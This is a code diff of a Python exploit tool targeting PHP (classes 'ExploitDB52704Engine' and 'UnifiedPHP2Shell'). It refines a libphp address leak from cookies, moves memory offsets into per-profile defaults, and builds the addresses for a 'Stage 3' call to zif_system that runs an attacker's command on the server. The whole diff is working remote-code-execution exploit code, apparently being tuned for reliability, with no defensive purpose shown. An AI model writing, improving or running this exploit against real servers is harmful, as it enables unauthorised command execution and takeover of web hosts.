@@ -715,14 +715,15 @@ def chunk_base_from_cookie(raw: bytes) -> int:
 def libphp_base_from_cookie(raw: bytes, dtor_offset: int = DEFAULT_DTOR_OFFSET) -> int:
     if len(raw) < 16:
         return 0
-    # Check default offset 8..16 first
     candidates = []
-    p_default = int.from_bytes(raw[8:16], "little")
-    if 0x6F0000000000 <= p_default < 0x800000000000:
-        candidates.append(p_default)
+    # Primary candidate at standard offset 8..16
+    if len(raw) >= 16:
+        p_default = int.from_bytes(raw[8:16], "little")
+        if 0x6F0000000000 <= p_default < 0x800000000000:
+            candidates.append(p_default)
 
-    # Also scan all 8-byte candidate offsets in raw
-    for i in range(0, len(raw) - 8 + 1, 8):
+    # Scan all byte offsets (aligned and unaligned) across the leak
+    for i in range(len(raw) - 8 + 1):
         if i != 8:
             p = int.from_bytes(raw[i:i + 8], "little")
             if 0x6F0000000000 <= p < 0x800000000000:
@@ -987,8 +988,8 @@ class RawHttpTarget:
 # ---------------------------------------------------------------------------
 
 class ExploitDB52704Engine:
-    def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: int = DEFAULT_ZIF_OFFSET,
-                 dtor_offset: int = DEFAULT_DTOR_OFFSET, htdata_offset: Optional[int] = None,
+    def __init__(self, target: RawHttpTarget, cmd: str, zif_offset: Optional[int] = None,
+                 dtor_offset: Optional[int] = None, htdata_offset: Optional[int] = None,
                  huge_mb: int = 12, profile: str = "bookworm",
                  staged_payload: Optional[bytes] = None,
                  stage1_n: Optional[int] = None,
@@ -998,8 +999,6 @@ class ExploitDB52704Engine:
                  logger_fn: Optional[Callable[[str, str], None]] = None):
         self.t = target
         self.cmd = cmd.encode("latin1")
-        self.zif_offset = zif_offset
-        self.dtor_offset = dtor_offset
         self.huge_mb = huge_mb
         self.profile = profile.lower()
         self.staged_payload = staged_payload
@@ -1008,6 +1007,8 @@ class ExploitDB52704Engine:
         self._calibration_swept = False
 
         prof = EXPLOIT_PROFILES.get(self.profile, EXPLOIT_PROFILES["bookworm"])
+        self.zif_offset = zif_offset if zif_offset is not None else prof.get("zif_offset", DEFAULT_ZIF_OFFSET)
+        self.dtor_offset = dtor_offset if dtor_offset is not None else prof.get("dtor_offset", DEFAULT_DTOR_OFFSET)
         self.stage1_n = stage1_n if stage1_n is not None else prof["stage1_n"]
         self.stage2_t = stage2_t if stage2_t is not None else prof["stage2_t"]
         self.stage2_v = stage2_v if stage2_v is not None else prof["stage2_v"]
@@ -1108,7 +1109,11 @@ class ExploitDB52704Engine:
             for j in range(cnt):
                 parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
         resp = self.t.post(build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
-        return libphp_base_from_cookie(parse_cookie_from_headers(resp), self.dtor_offset)
+        cookie_raw = parse_cookie_from_headers(resp)
+        libphp_base = libphp_base_from_cookie(cookie_raw, self.dtor_offset)
+        if not libphp_base and cookie_raw:
+            self._log("  └─ [LibPHP Leak Debug]:", f"Stage 2 returned {len(cookie_raw)}B cookie, matching dtor=0x{self.dtor_offset:x} (offset & 0xFFF = 0x{self.dtor_offset & 0xFFF:x})")
+        return libphp_base
 
     def _fake_payload(self, htdata: int, zif: int) -> Tuple[bytes, bytes]:
         cmd = self.cmd
@@ -1752,12 +1757,17 @@ class UnifiedPHP2Shell:
                         Fore.CYAN,
                     )
 
+                prof_data = EXPLOIT_PROFILES.get(profile.lower(), EXPLOIT_PROFILES["bookworm"])
+                eff_zif = zif_offset if zif_offset is not None else prof_data.get("zif_offset", DEFAULT_ZIF_OFFSET)
+                eff_dtor = dtor_offset if dtor_offset is not None else prof_data.get("dtor_offset", DEFAULT_DTOR_OFFSET)
+                eff_htdata = htdata_offset if htdata_offset is not None else prof_data.get("htdata_offset", BOOKWORM_HTDATA_OFFSET)
+
                 engine_52704 = ExploitDB52704Engine(
                     target=raw_tgt,
                     cmd=carrier_cmd,
-                    zif_offset=zif_offset or DEFAULT_ZIF_OFFSET,
-                    dtor_offset=dtor_offset or DEFAULT_DTOR_OFFSET,
-                    htdata_offset=htdata_offset,
+                    zif_offset=eff_zif,
+                    dtor_offset=eff_dtor,
+                    htdata_offset=eff_htdata,
                     huge_mb=huge_mb,
                     profile=profile,
                     staged_payload=staged_payload,
@@ -1810,13 +1820,8 @@ class UnifiedPHP2Shell:
 
                     if libphp:
                         engine_52704.rotate()
-                        prof_htdata = (
-                            htdata_offset
-                            or EXPLOIT_PROFILES.get(profile.lower(), {}).get("htdata_offset", BOOKWORM_HTDATA_OFFSET)
-                        )
-                        htdata = chunk + prof_htdata
-                        prof_zif = zif_offset or EXPLOIT_PROFILES.get(profile.lower(), {}).get("zif_offset", DEFAULT_ZIF_OFFSET)
-                        zif = libphp + prof_zif
+                        htdata = chunk + engine_52704.htdata_offset
+                        zif = libphp + engine_52704.zif_offset
                         self.progress("  └─ Stage 3:", f"Executing zif_system (HTDATA=0x{htdata:x}, ZIF=0x{zif:x})...", Fore.MAGENTA)
 
                         for a in range(1, retries + 2):
